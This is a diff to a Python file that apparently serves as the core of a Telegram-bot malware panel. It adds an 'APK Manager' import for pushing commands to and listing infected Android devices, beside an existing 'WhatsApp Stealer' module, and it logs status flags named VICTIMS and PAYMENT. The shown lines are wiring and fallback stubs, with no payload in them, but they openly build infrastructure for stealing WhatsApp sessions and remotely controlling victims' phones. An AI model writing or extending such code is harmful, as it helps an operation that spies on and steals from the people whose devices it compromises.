@@ -135,7 +135,7 @@ except Exception as e:
 
 
 # ============================================================
-# WhatsApp Stealer (جديد)
+# WhatsApp Stealer
 # ============================================================
 try:
     from wa_stealer import (
@@ -167,6 +167,50 @@ except Exception as e:
         return None
 
     def get_wa_session(session_id):
+        return None
+
+
+# ============================================================
+# APK Manager
+# ============================================================
+try:
+    from apk_manager import (
+        init_apk_routes,
+        apk_bp,
+        build_apk_panel,
+        push_apk_command,
+        create_apk_code,
+        get_apk_code,
+        get_apk_devices,
+        get_apk_device,
+    )
+    APK_MANAGER_ENABLED = True
+    logger.info("[+] apk_manager imported")
+except Exception as e:
+    logger.error(f"apk_manager: {e}")
+    APK_MANAGER_ENABLED = False
+
+    def init_apk_routes(app, bot):
+        pass
+
+    apk_bp = None
+
+    def build_apk_panel(device_id):
+        return InlineKeyboardMarkup()
+
+    def push_apk_command(*a, **kw):
+        return False
+
+    def create_apk_code(chat_id):
+        return None
+
+    def get_apk_code(code):
+        return None
+
+    def get_apk_devices():
+        return []
+
+    def get_apk_device(device_id):
         return None
 
 
@@ -337,6 +381,7 @@ logger.info(
     f"LSH={LSH_ENABLED} | "
     f"SH={SH_ENABLED} | "
     f"WA={WA_ENABLED} | "
+    f"APK_MGR={APK_MANAGER_ENABLED} | "
     f"VICTIMS={VICTIMS_ENABLED} | "
     f"PAYMENT={PAYMENT_ENABLED}"
     )
